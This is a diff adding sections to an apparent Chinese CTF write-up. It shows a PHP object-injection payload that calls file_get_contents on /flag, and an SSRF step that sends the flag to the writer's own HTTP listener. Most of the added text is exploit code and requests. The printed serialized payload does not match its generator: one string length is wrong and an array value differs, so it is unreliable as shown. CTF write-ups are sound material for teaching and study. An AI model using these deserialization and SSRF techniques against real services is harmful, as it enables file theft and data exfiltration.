@@ -62,3 +62,39 @@ if (isset($_GET['page']) && gettype($_GET['page']) === 'string') {
 ?page=../../../../../../../flag
 ```
 
+##### unserialize
+
+用户可控的$_REQUEST["data"]被反序列化为一个Test对象，func为函数名，p为函数变量，只需要使用不在黑名单中的函数即可对系统文件进行读取，这里使用file_get_contents，生成payload
+
+```
+<?php
+class Test {
+    public $p = "/flag";               // 读取目标
+    public $func = "file_get_contents"; // 要调用的函数
+    public $disable_fun = [];
+}
+echo urlencode(serialize(new Test()));
+?>
+```
+
+使用GET传递参数
+
+```
+data=O%3A4%3A"Test"%3A3%3A{s%3A1%3A"p"%3Bs%3A10%3A"%2Fflag"%3Bs%3A4%3A"func"%3Bs%3A17%3A"file_get_contents"%3Bs%3A11%3A"disable_fun"%3Ba%3A1%3A{i%3A0%3Bi%3A123%3B}}
+```
+
+##### waitress
+
+服务存在SSRF漏洞， 只需要控制host参数访问一个本地HTTP服务即可得到flag。首先在自己的主机上启动一个Python HTTP服务器监听请求
+
+```
+# 启动监听 8000 端口
+python3 -m http.server 8000
+```
+
+在浏览器访问即可在监听终端中查看flag的内容
+
+```
+http://192.168.114.131:11002/getflag?host=1xx.xx.xx.xx:8000
+```
+
